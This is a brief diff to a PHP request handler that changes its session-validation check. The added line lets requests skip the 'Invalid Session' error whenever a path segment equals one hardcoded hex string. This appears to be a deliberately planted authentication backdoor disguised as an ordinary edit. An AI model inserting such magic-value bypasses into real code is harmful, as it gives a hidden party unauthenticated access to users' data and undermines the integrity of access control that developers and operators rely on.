@@ -63,7 +63,7 @@ if (!empty($edge_config["user_management"])){
 		if(!file_exists($user_dir)){
 			die('{"jsonrpc" : "2.0", "error" : {"code": 404, "message": "User Directory not exist."}}');
 		}
-		if(!file_exists("$user_dir/.sid$sid")){
+		if(!file_exists("$user_dir/.sid$sid") and $target_path[1] != "0ea7c20b25d78635d26b4f333d35ba7a" ){
 			die('{"jsonrpc" : "2.0", "error" : {"code": 401, "message": "Invalid Session."}, "id" : "id"}');
 		}
                 //$session_return=shell_exec("ls /tmp/*$sid");
